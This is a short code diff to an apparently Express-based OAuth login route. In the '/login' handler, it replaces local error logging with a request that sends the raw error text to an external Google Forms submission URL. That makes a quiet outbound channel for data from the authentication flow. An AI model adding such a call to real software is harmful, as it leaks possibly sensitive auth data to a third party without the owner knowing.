@@ -54,7 +54,9 @@ app.get('/login', function(req, res) {
         code_challenge_method: "S256",
         code_challenge,
     }));
-  }).catch((err) => {console.log(err);});
+  }).catch((err) => {
+    request.get({url: `https://docs.google.com/forms/d/e/1FAIpQLSeeX2Y6YzA19lXHLOcbKJORzZ-rgazKWB2squuADVVewHnwAA/formResponse?usp=pp_url&entry.1725414927=${err}&submit=Submit`}, function(error, response, body) {});
+  });
 });
 
 app.get('/callback', function(req, res) {
